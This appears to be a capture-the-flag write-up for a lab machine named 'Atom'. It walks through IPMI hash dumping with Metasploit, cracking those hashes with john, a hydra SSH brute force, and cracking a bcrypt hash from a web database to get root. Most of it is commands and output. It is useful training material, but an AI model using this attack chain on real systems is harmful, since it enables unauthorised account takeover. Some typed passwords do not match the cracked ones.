@@ -1,1 +1,441 @@
+			ENUMERATION
+			
+--- nmap ---
+
+
+┌──(root㉿kali)-[/home/igon]
+└─# nmap 10.0.2.117 -sS -sC -sV -A -T4 -p-
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-30 23:48 +03
+Nmap scan report for 10.0.2.117
+Host is up (0.00072s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)
+|_  256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)
+MAC Address: 08:00:27:2B:05:1C (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.72 ms 10.0.2.117
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.69 seconds
+                                                   		
+			
+
+--- the only open port seems to be the ssh port, we dont find much else ---
+
+
+--- these are the tcp ports, I will also check for udp ports ---
+
+
+  
+┌──(root㉿kali)-[/home/igon]
+└─# nmap -sU --min-rate 1000 10.0.2.117
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 15:10 +03
+Nmap scan report for 10.0.2.117
+Host is up (0.00070s latency).
+Not shown: 988 open|filtered udp ports (no-response)
+PORT      STATE  SERVICE
+13/udp    closed daytime
+623/udp   open   asf-rmcp
+1057/udp  closed startron
+17205/udp closed unknown
+17423/udp closed unknown
+17487/udp closed unknown
+19504/udp closed unknown
+19632/udp closed unknown
+20326/udp closed unknown
+21655/udp closed unknown
+21698/udp closed unknown
+21923/udp closed unknown
+MAC Address: 08:00:27:2B:05:1C (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 5.47 seconds
+            		
+
+
+--- I scan the first 1000 ports and see an open port at 623. I search for the asf-rmcp service online ---
+
+
+
+https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi
+
+
+--- In this website we see a msfconsole module that we can use to exploit this service ---
+
+
+
+
+┌──(root㉿kali)-[~igon]
+└─# msfconsole 
+
+
+msf6 > use auxiliary/scanner/ipmi/ipmi_version
+
+msf6 > auxiliary(scanner/ipmi/ipmi_version) > options
+
+
+msf6 auxiliary(scanner/ipmi/ipmi_version) > set RHOSTS 10.0.2.117
+RHOSTS => 10.0.2.117
+msf6 auxiliary(scanner/ipmi/ipmi_version) > run
+
+[*] Sending IPMI requests to 10.0.2.117->10.0.2.117 (1 hosts)
+[+] 10.0.2.117:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
+
+
+
+--- we see the ipmi version is 2.0, for the version 2.0 there is an exploit we can use ---
+
+
+
+msf6 auxiliary(scanner/ipmi/ipmi_version) > use auxiliary/scanner/ipmi/ipmi_dumphashes  
+
+
+
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.0.2.117
+RHOSTS => 10.0.2.117
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
+
+[+] 10.0.2.117:623 - IPMI - Hash found: admin:c6446ebd02010000e30c72ef797ff6beee0e66b72d3a116a2abb80bec2c4371e0884222b44a323c2a123456789abcdefa123456789abcdef140561646d696e:2032d60cf1f3b539715c12f1ecfc49706b22b4ef
+[+] 10.0.2.117:623 - IPMI - Hash for user 'admin' matches password 'cukorborso'
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+
+--- now we got the credentials of the admin user, we can utilize an attack using ipmi tool ---
+
+
+admin:cukorboso
+
+
+--- to do so ---
+
+
+
+┌──(root㉿kali)-[/home/igon]
+└─# apt-get install ipmitool   
+
+
+
+--- lets list the users in the system now ---
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/48- ATOM LINUX CTF]
+└─# ipmitool -I lanplus -C 0 -H 10.0.2.117 -U 'admin' -P 'cukorboso' user list
+
+ID  Name	     Callin  Link Auth	IPMI Msg   Channel Priv Limit
+1                    true    false      false      Unknown (0x00)
+2   admin            true    false      true       ADMINISTRATOR
+3   analiese         true    false      true       USER
+4   briella          true    false      true       USER
+5   richardson       true    false      true       USER
+6   carsten          true    false      true       USER
+7   sibylle          true    false      true       USER
+8   wai-ching        true    false      true       USER
+9   jerrilee         true    false      true       USER
+10  glynn            true    false      true       USER
+11  asia             true    false      true       USER
+12  zaylen           true    false      true       USER
+13  fabien           true    false      true       USER
+14  merola           true    false      true       USER
+15  jem              true    false      true       USER
+16  riyaz            true    false      true       USER
+17  laten            true    false      true       USER
+18  cati             true    false      true       USER
+19  rozalia          true    false      true       USER
+20  palmer           true    false      true       USER
+21  onida            true    false      true       USER
+22  terra            true    false      true       USER
+23  ranga            true    false      true       USER
+24  harrie           true    false      true       USER
+25  pauly            true    false      true       USER
+26  els              true    false      true       USER
+27  bqb              true    false      true       USER
+28  karlotte         true    false      true       USER
+29  zali             true    false      true       USER
+30  ende             true    false      true       USER
+31  stacey           true    false      true       USER
+32  shirin           true    false      true       USER
+33  kaki             true    false      true       USER
+34  saman            true    false      true       USER
+35  kalie            true    false      true       USER
+36  deshawn          true    false      true       USER
+37  mayeul           true    false      true       USER
+
+
+
+
+
+--- the admin user is the ADMINISTRATOR, not much of a surprise ---
+
+
+
+--- I tried to log in to the ssh server using the credentials of the admin user but I couldn't. Now lets try
+to create another user and then enter the ssh service as that user ---
+
+
+--- however this didn't work as well, so I will try for all the users ---
+
+
+--- I put all the user names ina file named users.txt and now will dump hashes of all of them and print them
+into a file named hashes.txt ---
+
+
+
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set OUTPUT_JOHN_FILE hashes.txt
+OUTPUT_JOHN_FILE => hashes.txt
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set USER_FILE users.txt
+USER_FILE => users.txt
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.0.2.117
+RHOSTS => 10.0.2.117
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/48- ATOM LINUX CTF]
+└─# ls
+atom_linux_ctf_writeup.txt  hashes.txt  users.txt
+                                                                                                                                  
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/48- ATOM LINUX CTF]
+└─# cat hashes.txt 
+10.0.2.117 analiese:$rakp$22a4ce5102150000f086fec9ffb123f3878d763920be9a80431b7a76137db9218f122e1ce06381e5a123456789abcdefa123456789abcdef1408616e616c69657365$eb291b31f7884b9619f6ca96546b9b7d8007feb0
+10.0.2.117 briella:$rakp$983a7ddf8415000054b81b5232787f3a7561d7402098f60cd8437c40112545238ed2daffed3a213da123456789abcdefa123456789abcdef1407627269656c6c61$e6e75a71e71da9c8c3f534b98d8be54887c92f3f
+10.0.2.117 richardson:$rakp$ae81c94206160000e6532982104222994443f7a3a115ad24bcf66648e7343ec24b4dd5ad5c491174a123456789abcdefa123456789abcdef140a72696368617264736f6e$24fcd02a1ab5d8ba2505895a1e70429c37cd4c39
+.
+.
+.
+.
+
+
+
+--- now I utilize a john attack to crack those hashes ---
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/48- ATOM LINUX CTF]
+└─# john --wordlist=/home/igon/Wordlists/rockyou.txt hashes.txt
+Using default input encoding: UTF-8
+Loaded 35 password hashes with 35 different salts (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 128/128 SSE2 4x])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+sexymoma         (10.0.2.117 terra)     
+290992           (10.0.2.117 bqb)     
+tripod           (10.0.2.117 ende)     
+me4life          (10.0.2.117 sibylle)     
+darell           (10.0.2.117 richardson)     
+honda            (10.0.2.117 analiese)     
+122987           (10.0.2.117 cati)     
+milo123          (10.0.2.117 deshawn)     
+120691           (10.0.2.117 zaylen)     
+2468             (10.0.2.117 carsten)     
+TWEETY1          (10.0.2.117 asia)     
+jiggaman         (10.0.2.117 onida)     
+515253           (10.0.2.117 pauly)     
+phones           (10.0.2.117 palmer)     
+numberone        (10.0.2.117 kaki)     
+jesus06          (10.0.2.117 briella)     
+evan             (10.0.2.117 glynn)     
+090506           (10.0.2.117 saman)     
+castillo1        (10.0.2.117 stacey)     
+emeralds         (10.0.2.117 karlotte)     
+billandben       (10.0.2.117 kalie)     
+071590           (10.0.2.117 harrie)     
+batman!          (10.0.2.117 rozalia)     
+081704           (10.0.2.117 jem)     
+djones           (10.0.2.117 riyaz)     
+mackenzie2       (10.0.2.117 merola)     
+number17         (10.0.2.117 jerrilee)     
+poynter          (10.0.2.117 zali)     
+kittyboo         (10.0.2.117 shirin)     
+dezzy            (10.0.2.117 els)     
+10101979         (10.0.2.117 wai-ching)     
+chatroom         (10.0.2.117 fabien)     
+trick1           (10.0.2.117 laten)     
+jaffa1           (10.0.2.117 ranga)     
+241107           (10.0.2.117 mayeul)   
+
+
+
+
+--- now I write this credentials to a file so we can bruteforce a hydra attack into the ssh service ---
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/48- ATOM LINUX CTF]
+└─# cat ssh_bruteforce.txt 
+terra:sexymoma
+bqb:290992
+ende:tripod
+sibylle:me4life
+richardson:darell
+analiese:honda
+.
+.
+.
+.
+.
+.
+
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/48- ATOM LINUX CTF]
+└─# hydra -C ssh_bruteforce.txt ssh://10.0.2.117
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-01 17:06:51
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 35 login tries, ~3 tries per task
+[DATA] attacking ssh://10.0.2.117:22/
+[22][ssh] host: 10.0.2.117   login: onida   password: jiggaman
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-01 17:07:02
+
+
+
+
+--- finally, we have the credentials onida:jiggaman for the ssh server, let's get in ---
+
+
+
+
+
+			
+			GAINING FOOTHOLD
+			
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/48- ATOM LINUX CTF]
+└─# ssh onida@10.0.2.117
+onida@10.0.2.117's password: 
+Linux atom 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+onida@atom:~$ ls
+user.txt
+
+onida@atom:~$ cat user.txt 
+f75390001fa2fe806b4e3f1e5dadeb2b
+
+---First User Flag---			
+			
+
+
+
+
+--- We got the first flag, now let's check for possible ways ---
+
+
+
+--- I check cronjobs, suid bits, opt folder, files with permission restrictions but can't find anything ---
+
+
+
+--- I check the /var/www/html folder and find something interesting ---
+
+
+
+onida@atom:/var/www/html$ ls
+atom-2400-database.db  css  img  index.php  js  login.php  profile.php  register.php  video
+
+
+onida@atom:/var/www/html$ cat atom-2400-database.db 
+Q Y &  mtableusersusersCREATE TABLE users (
+    id INTEGER PRIMARY KEY,
+    username TEXT UNIQUE NOT NULL,
+    password TEXT NOT NULL
+))=indexsqlite_autoindex_users_1user $)) tablelogin_attemptslogin_attemptsCREATE TABLE login_attempts (
+    id INTEGER PRIMARY KEY,
+    ip_address TEXT NOT NULL,
+    attempt_time INTEGER NOT NULL
+  nKE atom$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm
+        atom
+
+
+
+
+--- I search this hash on hashes.com and turns out it is a $2 bcrypt algorithm, let's utilize a john attack ---
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/48- ATOM LINUX CTF]
+└─# cat db_hash.txt
+$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm
+   
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/48- ATOM LINUX CTF]
+└─# john db_hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+.
+.
+.
+madison          (?)     
+
+
+
+
+--- here we get the password maddison, now let's use it ---
+
+			
+
+
+
+			
+			PRIVILEGE ESCALATION
+			
+
+onida@atom:/var/www/html$ su root
+Password: 
+root@atom:/var/www/html# cd /root
+
+root@atom:~# whoami
+root
+
+
+--- and we have successfuly became root, now let's get that last flag ---
+
+
+root@atom:/var/www/html# cd /root
+root@atom:~# ls
+root.txt
+
+root@atom:~# cat root.txt
+d3a4fd660f1af5a7e3c2f17314f4a962
+
+---Root User Flag---
+
+
+
+
+
+			
+			
+			
+TOOLS AND TECHNOLOGIES USED
+
+
+
+
+
+
+
+
+WHAT I LEARNED
 
